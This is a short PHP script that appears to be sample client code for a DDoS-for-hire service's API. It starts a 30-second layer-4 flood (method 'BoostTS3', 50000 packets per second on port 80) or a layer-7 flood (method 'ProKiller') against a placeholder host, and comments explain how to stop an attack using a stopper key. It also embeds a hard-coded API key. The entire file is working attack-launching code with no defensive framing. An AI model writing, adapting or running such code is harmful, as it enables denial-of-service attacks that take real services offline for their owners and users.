<?php

require 'api.php';
$userID = 1;
$apiKey = '75JfznWJcq';
$api = new API($userID, $apiKey);
$layer = 4;

if($layer == 7) {
    $host = "http://1.1.1.1";
    $time = 30;
    $method = 'ProKiller';

    /* Parameters : Host , Port , Time , Method, PPS */
    $response = $api->startL7($host, $time, $method);
} else if($layer == 4) {
    $host = "1.1.1.1";
    $port = 80;
    $time = 30;
    $method = 'BoostTS3';
    $pps = 50000;

    /* Parameters : Host , Time , Method */
    $response = $api->startL4($host, $port, $time, $method, $pps);
}

// Stop Attack
/* To stop attack you need to save Stopper Key in your DB. Stopper key you get when you start attack as response: */
$responseAttack = json_decode($response);

// $stopper = $responseAttack['stopper'];

/* Parameters : Stopper */
// $response = $api->stopAttack($stopper);

print_r($responseAttack);